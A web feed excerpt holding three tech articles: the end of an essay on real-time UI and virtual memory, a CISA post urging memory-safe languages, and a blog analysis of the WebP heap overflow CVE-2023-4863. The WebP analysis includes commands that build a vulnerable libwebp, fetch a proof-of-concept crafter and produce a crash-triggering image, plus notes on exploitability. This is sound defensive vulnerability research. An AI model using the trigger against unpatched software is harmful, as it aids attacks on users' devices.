function will take more than a 500us on good data. It’s good enough to
avoid blocking functions on the main thread.” I have two words for you:
virtual memory.</p>
<h2 id="virtual-memory">Virtual Memory</h2>
<p>When it comes to Windows, Linux, and macOS, these operating systems
are virtual memory systems. When applications allocate memory, they are
not actually allocating physical memory. They are telling the operating
system that they will be using a certain memory region for a certain
purpose. This enables lots of functionality but in particular this
allows operating systems to save physical memory by transparently
storing memory pages onto a hard disk and restoring the page when the
application accesses the page again. This means that <em>a memory access
can block on a hard disk access</em>.</p>
<p>This is a transparent process that is not under control of the
application. Thus, if any given memory access can block on IO from a
disk drive, that means the system is fundamentally not real-time,
therefore UI applications on such a system are fundamentally broken.</p>
<p>This doesn’t seem like a common problem but whole system “out of
memory” conditions are not that uncommon. When the system is in this
state, it starts rapidly paging memory onto the hard disk. UI
applications will be affected and this will cause your system to hang
without warning and with no way to intervene since keypresses cannot be
processed. From a user standpoint, this is worse than a kernel panic.
This type of failure has happened to me multiple times on Linux so I
know it’s a problem there. Perhaps Windows and macOS engineers have
already considered this issue but I doubt it.</p>
<p>Is there a way to fix this? At least on Linux there is the
<code>mlock()</code> family of functions that tell the operating system
to put and keep the process’s memory pages into RAM. There are likely
similar functions available on Windows and macOS. Of course there are
still complications, e.g.&nbsp;is the application or the operating system
responsible for locking memory pages? how does the application know
which pages to lock? how does the operating system know which pages to
lock?</p>
<h2 id="real-time-scheduling">Real-time Scheduling</h2>
<p>The final fundamental issue with implementing real-time UI on top of
contemporary mainstream platforms is the lack of real-time scheduling
for the active UI application. These systems are time-sharing systems,
meaning that a process’s execution can be indefinitely paused if there
are many other processes competing for use of the CPU.</p>
<p>Imagine you have multiple background process running at 100% CPU,
then a UI event comes in to the active UI application. The operating
system may block for 100ms * N before allowing the UI application to
process the event, where N is the number of competing background
processes, potentially causing a delayed response to the user that
violates the real-time constraint (NB: 10Hz is a common timeslice for
time-sharing systems).</p>
<p>There is a solution for this as well, the window manager or
equivalent can tell the OS to give scheduling priority to whatever UI
application has active focus. This means that while the UI application
is active and needs CPU, background processes are starved. There are
complications with adapting a solution like this to existing systems as
well, e.g.&nbsp;What to do when the active UI application runs into an
infinite loop? What about multi-process UI applications?</p>
<h2 id="conclusion">Conclusion</h2>
<p>Hopefully I’ve at least convinced you that mainstream UI applications
are built on poor foundations. Do these UI applications work? Sure, most
of the time but when they fail due to bad real-time assumptions, they
fail in an annoying way. <strong>Beach ball of death</strong>. It’s
unacceptible for workstation-class interactive systems to ever fail this
way. I want to use responsive, correct applications. In the future, the
UIs on which people will depend will take real-time constraints into
account across the entire stack.</p>
<p>As far as I can tell, fixing this in a meaningful way will require
large ecosystem-level changes and broad awareness. Lots of wide-reaching
architectural decisions that ignore these issues have accumulated over
decades. I’m tempted to abandon using Windows, macOS and Linux as the
main platforms with which I interact.</p>
<p>Send any comments to <a href="https://twitter.com/cejetvole"><span data-cites="cejetvole">@cejetvole</span></a></p>
<p>Rian Hunter<br> 2023-09-21</p>
<p><em>Edit: The “Real-time Scheduling” section was added shortly after
initial publication.</em></p>


</div>]]></description>
        </item>
        <item>
            <title><![CDATA[The urgent need for memory safety in software products (122 pts)]]></title>
            <link>https://www.cisa.gov/news-events/news/urgent-need-memory-safety-software-products</link>
            <guid>37600937</guid>
            <pubDate>Thu, 21 Sep 2023 17:26:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cisa.gov/news-events/news/urgent-need-memory-safety-software-products">https://www.cisa.gov/news-events/news/urgent-need-memory-safety-software-products</a>, See on <a href="https://news.ycombinator.com/item?id=37600937">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>For over <a href="https://apps.dtic.mil/sti/citations/AD0758206" title="DTIC Bibliography">half a century</a>, software engineers have known malicious actors could exploit a class of software defect called “memory safety vulnerabilities” to compromise applications and systems. During that time, experts have repeatedly warned of the problems associated with memory safety vulnerabilities. Memory unsafe code even led to a major internet outage in 1988. Just how big a problem is memory unsafety? In a blog post, <a href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/" title="Microsoft Blog: A Proactive Approach to More Secure Code">Microsoft reported</a> that “~70% of the vulnerabilities Microsoft assigns a CVE [Common Vulnerability and Exposure] each year continue to be memory safety issues.” <a href="https://www.chromium.org/Home/chromium-security/memory-safety/" title="Chromium Security: Memory Safety">Google likewise reported</a> that “the Chromium project finds that around 70% of our serious security bugs are memory safety problems.” <a href="https://hacks.mozilla.org/2019/02/rewriting-a-browser-component-in-rust/" title="Mozilla: Rewriting a Browser Component in Rust">Mozilla reports</a> that in an analysis of security vulnerabilities, that “of the 34 critical/high bugs, 32 were memory-related.”</p><p>These vulnerabilities are not theoretical. Attackers use them in the commission of attacks against real people. For example, Google’s Project Zero team analyzed vulnerabilities that were used in the wild by attackers before they were reported to software providers (also called “zero-day vulnerabilities”). <a href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html" title="Google: The More You Know, The More You Know">They report</a> that “out of the 58 [such vulnerabilities] for the year, 39, or 67% were memory corruption vulnerabilities.” <a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/" title="Citizen Lab Blog">Citizen Lab uncovered</a> spyware used against civil society organizations that exploited memory safety vulnerabilities.</p><p>In what other industry would the market tolerate such well-understood and severe dangers for users of products for decades?</p><p>Over the years, software engineers have invented numerous clever, but ultimately insufficient mitigations for this class of vulnerability, including tools like memory randomization and sandboxing techniques that reduce impact, and tools for static and dynamic code analysis that reduce occurrence. In addition to those tools, organizations have spent significant time and money training their developers to avoid unsafe memory operations. There are also several parallel efforts to improve the memory safety of existing C/C++ code. Despite these efforts (and associated costs in complexity, time, and money), memory unsafety has been the most common type of software security defect for decades.</p><p>There are, however, a few areas that every software company should investigate. First, there are some promising memory safety mitigations in hardware. The Capability Hardware Enhanced RISC Instructions (<a href="https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/" title="CHERI Research Paper">CHERI</a>) research project uses modified processors to give memory unsafe languages like C and C++ protection against many widely exploited vulnerabilities. Another hardware assisted technology comes in the form of memory tagging extensions (MTE) that are available in some systems. While some of these hardware-based mitigations are still making the journey from research to shipping products, many observers believe they will become important parts of an overall strategy to eliminate memory safety vulnerabilities.</p><p>Second, companies should investigate memory safe programming languages. Most modern programming languages other than C/C++ are already memory safe. Memory safe programming languages manage the computer’s memory so the programmer cannot introduce memory safety vulnerabilities. Compared to other available mitigations that require constant upkeep – either in the form of developing new defenses, sifting through vulnerability scans, or human labor – no work has to be done once code is written in a memory safe programming language to keep it memory safe.</p><p>What has been lacking until a few years ago is a language with the speed of C/C++ with built-in memory safety assurances. In 2006, a software engineer at Mozilla began working on a new programming language called Rust. Rust version 1.0 was officially announced in 2015. Since then, several prominent software organizations have started to use it in their systems, including Amazon, Facebook, Google, Microsoft, Mozilla, and many others. It is also supported in the development of the Linux kernel.</p><p>Different products will require different investment strategies to mitigate memory unsafe code. The balance between C/C++ mitigations, hardware mitigations, and memory safe programming languages may even differ between products from the same company. No one approach will solve all problems for all products. The one thing software manufacturers cannot do, however, is ignore the problem. The software industry must not kick the can down the road another decade through inaction.</p><p>CISA’s <a href="https://www.cisa.gov/securebydesign" title="CISA | Secure By Design">secure by design white paper</a> outlines three core principles for software manufacturers: take ownership of customer security outcomes, embrace radical transparency, and lead security transformations from the top of the organization. Solutions to the memory unsafety problem will incorporate all three principles.</p><p>CISA urges software manufacturers to make it a top-level company goal to reduce and eventually eliminate memory safety vulnerabilities from their product lines. To demonstrate such a commitment, companies can publish a “memory safety roadmap” that includes information about how they are modifying their software development lifecycle (SDLC) to accomplish this goal. A roadmap might include details like the date after which it will build new products or components in a memory safe programming language and plans to support the memory safety initiatives of open source libraries that are part of their supply chain.</p><p>Memory unsafety has plagued the software industry for decades and will continue to be a major source of vulnerabilities and real-world harm until top business leaders from the software manufacturers make appropriate investments and take ownership of the security outcomes of their customers. As we recognize National Coding Week, we look forward to participants across the software industry working together to make software that is safer by design, and memory safety is the key to achieving that goal.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The WebP 0day (201 pts)]]></title>
            <link>https://blog.isosceles.com/the-webp-0day/</link>
            <guid>37600852</guid>
            <pubDate>Thu, 21 Sep 2023 17:21:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.isosceles.com/the-webp-0day/">https://blog.isosceles.com/the-webp-0day/</a>, See on <a href="https://news.ycombinator.com/item?id=37600852">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
                    <p>Early last week, Google released a new <a href="https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html?ref=blog.isosceles.com">stable update</a> for Chrome. The update included a single security fix that was reported by Apple's Security Engineering and Architecture (SEAR) team. The issue, CVE-2023-4863, was a heap buffer overflow in the WebP image library, and it had a familiar warning attached: </p><p>"Google is aware that an exploit for CVE-2023-4863 exists in the wild."</p><p>This means that someone, somewhere, had been caught using an exploit for this vulnerability. But who discovered the vulnerability and how was it being used? How does the vulnerability work? Why wasn't it discovered earlier? And what sort of impact does an exploit like this have?</p><p>There are still a lot of details that are missing, but this post attempts to explain what we know about the unusual circumstances of this bug, and provides a new technical analysis and proof-of-concept trigger for CVE-2023-4863 ("the WebP 0day").</p><p>This work was made possible by major technical contributions from <a href="https://twitter.com/mistymntncop?ref=blog.isosceles.com">@mistymntncop</a> -- thank you!</p><h2 id="unraveling-the-timeline">Unraveling the Timeline</h2><p>Immediately after the Chrome security update was released, experts began to <a href="https://twitter.com/msuiche/status/1701714151091949812?ref=blog.isosceles.com">speculate</a> that there was a link between CVE-2023-4863 and an earlier CVE from Apple, CVE-2023-41064. The theory goes something like this.</p><p>Early in September (exact date unknown), Citizen Lab detected suspicious behavior on the iPhone of "an individual employed by a Washington DC-based civil society organization":</p><p><a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/?ref=blog.isosceles.com">BLASTPASS: NSO Group iPhone Zero-Click, Zero-Day Exploit Captured in the Wild</a></p><p>They attributed the behavior to a "zero-click" exploit for iMessage being used to deploy NSO group's Pegasus spyware, and sent their technical findings to Apple. Apple responded swiftly, and on September 7 they released a <a href="https://support.apple.com/en-us/HT213905?ref=blog.isosceles.com">security bulletin</a> that featured two new CVEs from the attack Citizen Lab identified. On each CVE they note: "<em>Apple is aware of a report that this issue may have been actively exploited.</em>"</p><p>Citizen Lab called this attack "BLASTPASS", since the attackers found a clever way to bypass the "<a href="https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html?ref=blog.isosceles.com">BlastDoor</a>" iMessage sandbox. We don't have the full technical details, but it looks like by bundling an image exploit in a <a href="https://developer.apple.com/documentation/passkit/?ref=blog.isosceles.com">PassKit</a> attachment, the malicious image would be processed in a different, unsandboxed process. This corresponds to the first CVE that Apple released, CVE-2023-41061.</p><p>But you'd still need an image exploit to take advantage of this situation, and indeed, the second CVE that Apple released is CVE-2023-41064, a buffer overflow vulnerability in ImageIO. ImageIO is Apple's image parsing framework. It will take a sequence of bytes and attempt to match the bytes to a suitable image decoder. Several different formats are supported, and ImageIO has been an <a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html?ref=blog.isosceles.com">active</a> <a href="https://support.apple.com/en-ng/HT213670?ref=blog.isosceles.com">area</a> of security research. We don't have any technical details about CVE-2023-41064 yet, so we don't know which image format it affects. </p><p>But we do know that ImageIO recently began to support WebP files, and we know that on September 6 (one day before the iOS/macOS security bulletin), Apple's security team reported a WebP vulnerability to Chrome that was urgently patched (just 5 days after the initial report) and marked by Google as "exploited in the wild". Based on this, it seems likely that the BLASTPASS vulnerability and CVE-2023-4863 ("the WebP 0day") are the same bug.</p><h2 id="the-webp-0daytechnical-analysis">The WebP 0day -- Technical Analysis</h2><p>By cross-referencing the bug ID from Chrome's security bulletin with recent open source commits to the libwebp library code, it's possible to find the following patch:</p><p><a href="https://chromium.googlesource.com/webm/libwebp/+/902bc9190331343b2017211debcec8d2ab87e17a?ref=blog.isosceles.com">Fix OOB write in BuildHuffmanTable</a></p><p>This patch was created on September 7 (one day after Apple's report), and corresponds to CVE-2023-4863. Based on an initial review of the patch, we learn the following:</p><ul><li>The vulnerability is in the "lossless compression" support for WebP, sometimes known as VP8L. A lossless image format can store and restore pixels with 100% accuracy, meaning that the image will be displayed with perfect accuracy. To achieve this, WebP uses an algorithm called <a href="https://en.wikipedia.org/wiki/Huffman_coding?ref=blog.isosceles.com">Huffman coding</a>.<br></li><li>Although Huffman coding is conceptually based on a tree data structure, modern implementations have been optimized to use tables instead. The patch suggests that it was possible to overflow the Huffman table when decoding an untrusted image.<br></li><li>Specifically, the vulnerable versions use memory allocations based on pre-calculated buffer sizes from a fixed table, and will then construct the Huffman tables directly into that allocation. The new version does a "first pass" construction that calculates the total size that the output table will require, but doesn't actually write the table to the buffer. If the total size is bigger than the pre-calculated buffer size, then a larger allocation is made.</li></ul><p>This is a great start, but it's non-constructive. We want to be able to construct an example file that can actually trigger the overflow, and to do that we have to understand how this code is actually working and why the pre-calculated buffer sizes weren't sufficient.</p><p>Stepping back, what is the vulnerable code actually doing? When a WebP image is compressed in a lossless way, a frequency analysis of the input pixels is performed. The basic idea is that input values that occur more frequently can be assigned to a shorter sequence of output bits, and values that occur less frequently can be assigned to longer sequences of output bits. The real trick is that the output bits are cleverly chosen so that the decoder can always work out the length of that particular sequence -- i.e. it's always possible to disambiguate between a 2-bit code and a 3-bit code, and so on, and so the decoder always knows how many bits to consume.</p><p>To achieve this, the compressed image has to include all of the statistical information about frequencies and code assignments, so that the decoder can reproduce the same mapping between codes and values. As mentioned, internally webp uses a table for this (they call it the "huffman_table")... but the tables themselves can be quite large, and including them alongside the compressed image would make the file size increase. The solution is to use Huffman coding to compress the tables as well. It's turtles all the way down.</p><p>This means that there's a non-trivial amount of mental gymnastics involved in analyzing/triggering the bug. Based on a review of the patch, we can isolate the memory allocation that is the most likely candidate for being overflowed and come up with a plan. </p><p>We're trying to overflow the huffman_tables allocation in ReadHuffmanCodes (src/dec/vp8l_dec.c), and the idea is to use the VP8LBuildHuffmanTable/BuildHuffmanTable call in ReadHuffmanCode (not the one in ReadHuffmanCodeLengths) to shift the huffman_table pointer past the pre-calculated buffer size. To add to the complexity, there's actually 5 different segments of the Huffman table, each with a different alphabet size (e.g. number of possible output symbols for that particular segment of the table) -- and we'll probably have to craft all 5 of those to get close enough to the end of the buffer to cause an overflow.</p><p>At this point I had come up with a basic theory of how to proceed and started manually crafting a file that could reach this deep into the code, and around this time I started chatting with <a href="https://twitter.com/mistymntncop?ref=blog.isosceles.com">@mistymntncop</a>. It turns out that they had also been attempting to reproduce this issue, and they had built harness code to create a well-formed WebP with arbitrary Huffman coding data ("code lengths"). I tried it out and it worked perfectly, we could pass arbitrary code_lengths array into the BuildHuffmanTable call that we were targeting. Brilliant.</p><p>Now the challenge was to find a group of code_lengths that would make BuildHuffmanTable exceed the pre-calculated buffer size. I started with some manual experimentation -- changing the code_lengths array to affect the internal histogram (essentially the count array in BuildHuffmanTable), and then watching what affect each of the 16 histogram entries had on total_size, the key variable that we needed to increase to a larger than expected value. </p><p>It quickly became clear that there was a complex interaction between the histogram's starting state, the tree statistics (num_open and num_nodes), and the "key" variable that tracks the starting location of the "ReplicateValue" operation that wrote entries into the output table that we're trying to overflow. It reminded me of watching the internal state of a cryptographic hash function, and without knowing a lot more about Huffman trees and WebP's specific implementation choices, I didn't feel confident that I'd be able to manually craft an input that would even be considered correct by BuildHuffmanTable, let alone one that makes BuildHuffmanTable return an unexpectedly large value.</p><p>My next idea was to brute-force a solution. I had noticed that the first 9 entries in the histogram (e.g. count[0] .. count[8], which are called the "root table") wouldn't have much influence on the total_size, but could influence the internal state for subsequent computations (such as by pushing the number of nodes too high). The final entries in the histogram (e.g. count[9] .. count[15], which are called the "second level tables") had a direct effect on the final total_size value. With this in mind I created a few different statistical distributions that generally kept the values of the root table low (typically summing to less than 8) and the second level table higher. This approach managed to find correct inputs, and some of them resulted in output tables that were quite large, but still less than the pre-calculated buffer sizes.</p><p>I decided I needed to understand how the pre-calculated sizes were derived. There are actually several different pre-calculated size buckets depending on the number of color cache bits that are specified. The buckets are defined in kTableSize, which includes a helpful description of the values and an invaluable tip: <em>"All values computed for 8-bit first level lookup with Mark Adler's tool: &nbsp; </em><a href="https://github.com/madler/zlib/blob/v1.2.5/examples/enough.c?ref=blog.isosceles.com"><em>https://github.com/madler/zlib/blob/v1.2.5/examples/enough.c</em></a><em>"</em></p><p>The "enough" tool emits the histogram for the largest possible Huffman tree lookup table for any given alphabet size, root table size, and maximum code length. Using Mark Adler's tool, I could replicate the pre-calculated buffer sizes, and using <a href="https://twitter.com/mistymntncop?ref=blog.isosceles.com">@mistymntncop</a>'s tool I could verify that the specific code_lengths emitted by "enough" would 100% fill up the huffman_tables allocation. That's great, but the whole idea of a heap overflow would be to fill up the allocation to 101%...</p><p>I followed a dead-end here, which is that the "enough" tool only works for color_cache sizes up to 8-bits. How did they derive the values for 9-bit, 10-bit, or 11-bit caches, all of which are considered valid? Maybe they just guessed and these values are wrong? I think Google must have modified "enough" to work on larger alphabet sizes, because I managed to replicate their numbers by making some minor changes to "enough" (things like using the 128-bit integer scalar type compiler extension to be able to count the number of trees without overflow).</p><p>At this point there was a long process of angst. The "enough" tool is clear in its documentation that it calculates the maximum value for <em>valid and complete</em> codes. There must be some configuration of this input histogram that produces a tree that WebP considers to be valid and complete, but is actually incomplete/invalid in a way that produces a larger expansion than anticipated. The patch even hints in this direction, saying: <em>"make sure that valid (but unoptimized because of unbalanced codes) streams are still decodable"</em></p><p>In the end I managed to convince myself that this wasn't possible by enumerating all of the possible valid trees in the smallest of the tables (a symbol size of 40), which also happened to be the last of the 5 tables we needed to fill. The purported maximum size for a symbol size of 40 with a root table of 8-bits and a maximum code length of 15 is 410. If you can generate anything bigger than 410, then you win. But none of the codes that BuildHuffmanTable would consider valid had a size bigger than 410 (and most of them were much smaller). It seems like the consistency check at the end of BuildHuffmanTable, e.g. checking that the number of output nodes is an expected value, was ensuring that the codes it accepted were in line with "enough" and the pre-calculated buffer sizes it gave.</p><p>But the BuildHuffmanTable function is writing values to the output table using the "ReplicateValue" operation mentioned earlier. What if we built 4 valid Huffman trees that resulted in 4 maximally sized output tables, and then supplied an invalid Huffman tree for the last table? Could we get ReplicateValue to write out-of-bounds from an invalid starting key prior to the final consistency check on the node count? The answer is: yes, we can.</p><p>Here's how to replicate the bug:<br></p><pre><code>  # checkout webp
$ git clone https://chromium.googlesource.com/webm/libwebp/ webp_test
$ cd webp_test/
  # checkout vulnerable version
$ git checkout 7ba44f80f3b94fc0138db159afea770ef06532a0
  # enable AddressSanitizer
$ sed -i 's/^EXTRA_FLAGS=.*/&amp; -fsanitize=address/' makefile.unix
  # build webp
$ make -f makefile.unix
$ cd examples/
  # fetch mistymntncop's proof-of-concept code
$ wget https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/craft.c
  # build and run proof-of-concept
$ gcc -o craft craft.c
$ ./craft bad.webp
  # test trigger file
$ ./dwebp bad.webp -o test.png
=================================================================
==207551==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x626000002f28 at pc 0x56196a11635a bp 0x7ffd3e5cce90 sp 0x7ffd3e5cce80
WRITE of size 1 at 0x626000002f28 thread T0
#0 0x56196a116359 in BuildHuffmanTable (/home/isosceles/source/webp/webp_test/examples/dwebp+0xb6359)
#1 0x56196a1166e7 in VP8LBuildHuffmanTable (/home/isosceles/source/webp/webp_test/examples/dwebp+0xb66e7)
#2 0x56196a0956ff in ReadHuffmanCode (/home/isosceles/source/webp/webp_test/examples/dwebp+0x356ff)
#3 0x56196a09a2b5 in DecodeImageStream (/home/isosceles/source/webp/webp_test/examples/dwebp+0x3a2b5)
#4 0x56196a09e216 in VP8LDecodeHeader (/home/isosceles/source/webp/webp_test/examples/dwebp+0x3e216)
#5 0x56196a0a011b in DecodeInto (/home/isosceles/source/webp/webp_test/examples/dwebp+0x4011b)
#6 0x56196a0a2f06 in WebPDecode (/home/isosceles/source/webp/webp_test/examples/dwebp+0x42f06)
#7 0x56196a06c026 in main (/home/isosceles/source/webp/webp_test/examples/dwebp+0xc026)
#8 0x7f7ea8a8c082 in __libc_start_main ../csu/libc-start.c:308
#9 0x56196a06e09d in _start (/home/isosceles/source/webp/webp_test/examples/dwebp+0xe09d)
0x626000002f28 is located 0 bytes to the right of 11816-byte region [0x626000000100,0x626000002f28)
allocated by thread T0 here:
#0 0x7f7ea8f2d808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144
#1 0x56196a09a0eb in DecodeImageStream (/home/isosceles/source/webp/webp_test/examples/dwebp+0x3a0eb)
SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/isosceles/source/webp/webp_test/examples/dwebp+0xb6359) in BuildHuffmanTable
...</code></pre><p>In practice there are many such inputs that will overflow huffman_tables. I've found code lengths that result in writes as far as 400 bytes past the end of the huffman_tables allocation. Even with only partial control of the value being written, it definitely looks exploitable. To exploit this issue you would likely need to use the color cache bits (or num_htree_groups) to get a huffman_tables allocation that is roughly page aligned, but that shouldn't be a problem. It may be that there are other ways of causing an OOB write on the huffman_tables allocation, but this method looks like an acceptable approach. </p><p>The invalid input itself is quite unusual -- mistymntncop provided the following visualization of the Huffman tree it creates using a <a href="https://github.com/mistymntncop/CVE-2023-4863/blob/main/print_tree.c?ref=blog.isosceles.com">tool</a> they wrote to assist in this analysis:</p><figure><img src="https://blog.isosceles.com/content/images/2023/09/webp_a.jpg" alt="" loading="lazy" width="2000" height="625" srcset="https://blog.isosceles.com/content/images/size/w600/2023/09/webp_a.jpg 600w, https://blog.isosceles.com/content/images/size/w1000/2023/09/webp_a.jpg 1000w, https://blog.isosceles.com/content/images/size/w1600/2023/09/webp_a.jpg 1600w, https://blog.isosceles.com/content/images/2023/09/webp_a.jpg 2048w" sizes="(min-width: 720px) 720px"></figure><p>If you zoom in, you can see that the tree is partially unbalanced, and that a section of the unbalanced branch has a large number of internal nodes with no children in them at all. This structure results in a "key" index that a valid tree would never be able to reach. Here's what a valid tree looks like:</p><figure><img src="https://blog.isosceles.com/content/images/2023/09/webp_b.jpg" alt="" loading="lazy" width="2000" height="1518" srcset="https://blog.isosceles.com/content/images/size/w600/2023/09/webp_b.jpg 600w, https://blog.isosceles.com/content/images/size/w1000/2023/09/webp_b.jpg 1000w, https://blog.isosceles.com/content/images/size/w1600/2023/09/webp_b.jpg 1600w, https://blog.isosceles.com/content/images/2023/09/webp_b.jpg 2048w" sizes="(min-width: 720px) 720px"></figure><p>As for the patch, it seems to work almost by accident. As mentioned earlier, the patched version does a first pass with BuildHuffmanTable to calculate the total size required. In practice, this issue is patched because BuildHuffmanTable will fail (return 0) for all of the invalid inputs that would otherwise have resulted in an out-of-bounds write, and since the first pass is explicitly not writing to the table, it doesn't matter that the invalid tree is partially processed. In other words, I thought the patch was dynamically increasing the size of the buffer as needed to prevent heap overflow, but it's actually just denying the inputs that would cause a heap overflow instead. It's definitely hard to reason about, but I searched for "valid and complete" codes that would still trigger this overflow, and I couldn't find any. So it looks like the patch should be sufficient.</p><h2 id="early-discovery">Early Discovery?</h2><p>Immediately after Chrome's security update, there was some discussion about fuzzing. A binary file format implemented by a C code library is an ideal target for fuzzing -- so why hadn't this bug been found earlier? Had the library not been fuzzed enough? Or had it not been fuzzed right?</p><p>Google's OSS-Fuzz project has fuzzed hundreds of open source libraries for many years now, including libwebp and many other image decoding libraries. It's possible to look in <a href="https://storage.googleapis.com/oss-fuzz-coverage/libwebp/reports/20230901/linux/src/libwebp/src/utils/report.html?ref=blog.isosceles.com">full detail</a> at the code coverage for OSS-Fuzz projects, and it's clear that lossless support for WebP was being fuzzed extensively: </p><figure><img src="https://lh4.googleusercontent.com/QSgfxn8AQf2OzBIZuM3D6WYjT3lMFV9hFfP5zzfCTFZb6ekL1yabmrEo9QYn2qFhgnd7fBDneL6Jfei58v06VjUCSfsCL8AQW8Lj_QLVr5dz0dk2kyOU4OQQX7KqMuMRih0IhhLI_6YzrDzzY1A6dt4" alt="" loading="lazy" width="406" height="341"></figure><p>The problem, we now know, is that this format is incredibly complex and fragile, and the preconditions to trigger this issue are immense. Out of billions of possibilities, we have to construct a sequence of 4 valid Huffman tables that are maximally sized for two different alphabet sizes (280 and 256) before constructing a very specific type of invalid Huffman table for a third alphabet size (40). If a single bit is wrong at any stage, the image decoder throws an error and nothing bad happens.</p><p>In fact one of the first things that Google did after the WebP 0day was fixed was to release a new fuzzer specifically for the Huffman routines in WebP. I tried running this fuzzer for a bit (with a bit of backporting required due to API changes) and it predictably did not find CVE-2023-4863.</p><p>Perhaps I'm wrong and some of the newer techniques involving symbolic execution (like Quarkslab's <a href="https://blog.quarkslab.com/introducing-tritondse-a-framework-for-dynamic-symbolic-execution-in-python.html?ref=blog.isosceles.com">TritonDSE</a>) would be able to solve this -- but standard approaches based on bitflip mutations with a code-coverage feedback loop, and even slightly more sophisticated approaches like <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md?ref=blog.isosceles.com">CmpLog</a> (input-to-state), would not be able to navigate through all of these intermediary steps to reach this extremely pessimal state. </p><p>It's interesting to contrast this bug with an earlier vulnerability, the <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-15999.html?ref=blog.isosceles.com">Load_SBit_Png</a> bug in FreeType, which was also discovered "in the wild" in an advanced 0day exploit. It's similar in the sense of being a heap overflow in a common library for a binary file format (for fonts in this instance) written in C, it's similar that it affected Chrome, and it's similar in the sense that FreeType had been heavily fuzzed in the months and years leading up to this attack. The difference was that the Load_SBit_Png bug wasn't found during fuzzing due to a lack of adequate harnessing, rather than some specific constraint of the vulnerability that made it difficult to fuzz. If the fuzzing harnesses had been updated earlier to better reflect the APIs usage, the Load_SBit_Png bug would have been discovered with fuzzing.</p><p>That's not the case for the WebP 0day (CVE-2023-4863) -- unless, perhaps, you got incredibly lucky by having a file in your fuzzing corpus that was already extremely close to the bug and your fuzzer was very well calibrated in terms of its mutation rates. </p><p>In practice, I suspect this bug was discovered through manual code review. In reviewing the code, you &nbsp;would see the huffman_tables allocation being made during header parsing of a VP8L file, so naturally you would look to see how it's used. You would then try to rationalize the lack of bounds checks on the huffman_tables allocation, and if you're persistent enough, you would progressively go deeper and deeper into the problem before realizing that the code was subtly broken. I suspect that most code auditors aren't that persistent though -- this Huffman code stuff is mind bending -- so I'm impressed.</p><h2 id="whats-the-big-deal">What's The Big Deal</h2><p>There's some good news, and some bad news. </p><p>✓ The good news is that the team at Citizen Lab has, once again, done an amazing job of catching a top tier exploit being used in the wild. They have cultivated a lot of trust with the organizations and individuals that are most likely to be harmed by exploits. It's very impressive.</p><p>✗ The bad news is that exploits like this continue to have societal ramifications, and we can only guess how bad the situation really is. The truth is that nobody knows for sure, even the people with exploits.</p><p>✓ The good news is that Apple and Chrome did an amazing job at responding to this issue with the urgency that it deserves. It looks like both groups pushed out an update to their <em>billions</em> of users in just a number of days. That's an impressive feat, it takes an incredible effort and coordination across threat analysis, security engineering, software engineering, product management, and testing teams to make this even remotely possible.</p><p>✗ The bad news is that Android is still likely affected. Similar to Apple's ImageIO, Android has a facility called the <a href="https://developer.android.com/reference/android/graphics/BitmapFactory?ref=blog.isosceles.com">BitmapFactory</a> that handles image decoding, and of course libwebp is supported. As of today, Android hasn't released a security bulletin that includes a fix for CVE-2023-4863 -- although the fix has been merged into AOSP. To put this in context: if this bug does affect Android, then it could potentially be turned into a remote exploit for apps like Signal and WhatsApp. I'd expect it to be fixed in the October bulletin.</p><p>✓ The good news is that the bug seems to be patched correctly in the upstream libwebp, and that patch is making its way to everywhere it should go. </p><p>✗ The bad news is that libwebp is used in a lot of places, and it could be a while until the patch reaches saturation. Also, the code is still very difficult to reason about, and we can't rely on fuzzers to find any other bugs that are lurking here.</p><h2 id="final-thoughts">Final Thoughts</h2><p>The WebP 0day (CVE-2023-4863) is a subtle but powerful vulnerability in a widely used open source library that is highly exposed to attacker inputs. It's both very difficult to fuzz, and very difficult to manually trigger -- but the prize is an exploitable heap overflow that works on multiple browsers, operating systems, and applications. It's likely that CVE-2023-4863 is the same vulnerability used in the <a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/?ref=blog.isosceles.com">BLASTPASS</a> attacks.</p><p>I started this technical analysis shortly after releasing last week's <a href="https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/">blog post on Phineas Fisher</a>, which means I was several days late to the party. In practice it took about 3 full work days worth of work (with a lot of additional help from <a href="https://twitter.com/mistymntncop?ref=blog.isosceles.com">@mistymntncop</a>) to figure out the bug and build a reproducing testcase. </p><p>The lack of available technical information from the vendors here made verification challenging, and it's questionable who this really benefits. Attackers are <a href="https://googleprojectzero.blogspot.com/2023/09/analyzing-modern-in-wild-android-exploit.html?ref=blog.isosceles.com">clearly highly motivated</a> to track and exploit N-day vulnerabilities, and the lack of technical details being released won't significantly slow them down. On the other hand, very few defenders are resourced to be able to perform the type of technical analysis I've shared today. It's counter-intuitive, but withholding basic technical details about how these attacks are working in an asymmetry that mostly benefits attackers -- you quickly end up in a situation where attackers have access to insights about the vulnerability/exploit that defenders don't have.</p><p>This bug also shows that we have an over-reliance on fuzzing for security assurance of complex parser code. Fuzzing is great, but we know that there are many serious security issues that aren't easy to fuzz. For sensitive attack surfaces like image decoding (zero-click remote exploit attack surface), there needs to 1) be a bigger investment in proactive source code reviews, and 2) a renewed focus on ensuring these parsers are adequately sandboxed.</p><p>Finally, thanks again to <a 